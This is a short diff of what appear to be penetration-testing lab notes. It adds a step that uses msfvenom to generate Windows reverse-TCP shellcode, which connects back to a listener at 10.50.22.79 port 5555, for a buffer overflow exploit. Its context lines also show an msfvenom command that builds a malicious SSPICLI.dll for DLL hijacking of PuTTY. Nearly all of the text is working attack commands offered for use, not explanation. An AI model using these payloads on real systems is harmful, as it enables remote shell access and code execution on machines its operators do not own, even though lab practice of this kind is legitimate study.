@@ -113,8 +113,13 @@ RECON FROM GRAYHOST ON THE WEB SERVER
 	
 	- msfvenom -p windows/exec CMD="cmd /C whoami > C:\\findme.txt" -f dll > SSPICLI.dll			#this is for putty, any other binary requires reanalysis
 	
-	
-	
+
+
+
+16. to generate shellcode for the windows buffer overflow exploit: the following command must be used. note: your existing script should work just fine but if it doesnt, try regenerating shellcode
+
+	msfvenom -p windows/shell/reverse_tcp lhost=10.50.22.79 lport=5555 -b '\x00' -f python
+
 	
 	
 	
